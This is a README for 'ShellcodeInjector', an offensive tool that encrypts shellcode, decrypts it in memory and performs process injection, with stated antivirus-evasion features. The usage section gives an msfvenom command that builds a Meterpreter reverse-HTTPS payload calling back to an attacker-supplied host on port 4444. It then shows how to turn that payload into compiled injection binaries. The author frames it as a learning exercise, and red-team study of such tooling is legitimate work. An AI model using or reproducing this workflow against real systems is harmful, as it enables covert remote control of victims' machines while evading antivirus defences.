ShellcodeInjector
===
ShellcodeInjector takes a shellcode as input, encrypts it and then decrypts it in memory before performing process injection.

The idea of the project is to create process injection templates based on a list of [Windows API functions](https://malapi.io/). 

This is just an excercise for me for learning C# and C++. 

Installation
---
* For compiling C++ code, install [mingw64](https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/8.1.0/threads-posix/seh/x86_64-8.1.0-release-posix-seh-rt_v6-rev0.7z) and udpate the System Variable PATH
* For compiling C# you can use `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`

Usage
---
First, you need to obtain a shellcode, for example from metasploit,:
```
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your-IP> LPORT=4444 -f raw > /tmp/msf64_reverse_https.raw
```

Then, you can generate the source code payloads
```
root@kali:~# python3 shellcode_encoder.py /tmp/msf64_reverse_https.raw RandomK3y domain.local
```
This will generate source code payloads and will save them in the `results` folder. Then use [compile64.bat](results/compile64.bat) to compile the source code payloads.



Credits
---
ShellcodeInjector is a Python v3 version of [ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper) with additional process injection and AV evasion capabilities. 